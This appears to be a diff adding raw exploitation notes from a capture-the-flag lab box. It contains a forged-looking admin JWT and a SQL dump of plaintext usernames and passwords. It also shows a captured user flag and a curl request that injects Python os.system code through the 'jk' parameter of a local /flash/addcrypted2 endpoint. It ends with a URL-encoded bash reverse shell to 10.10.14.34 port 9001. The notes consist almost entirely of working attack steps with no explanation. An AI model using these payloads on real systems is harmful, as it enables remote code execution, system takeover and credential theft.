@@ -1,0 +1,31 @@
+token	b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUyNzE4NTh9.gkZwH55dCmpuHU_I-4DT4h0KJ2UJVSY9OIyZDqSeYRM'
+
+
+{
+  "message": "Your id is 229."
+}
+
+sql
++------------------------+----------+
+| password               | username |
++------------------------+----------+
+| admin                  | admin    |
+| HereIsYourPassWord1431 | sau      |
++------------------------+----------+
+
+
+snap  user.txt
+-bash-5.0$ cat user.txt
+7d805af86de751f78233e1a67ffd3759
+
+
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: 127.0.0.1:8000' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 184' \
+    --data-binary $'package=xxx&crypted=AAAA&jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%74%6f%75%63%68%20%2f%74%6d%70%2f%70%77%6e%64%22%29;f=function%20f2(){};&passwords=aaaa' \
+    $'http://127.0.0.1:8000/flash/addcrypted2'
+
+jk=pyimport os;os.system("touch /tmp/pwnd");f=function f2(){};
+
+/bin/bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.34/9001+0>%261'
+/
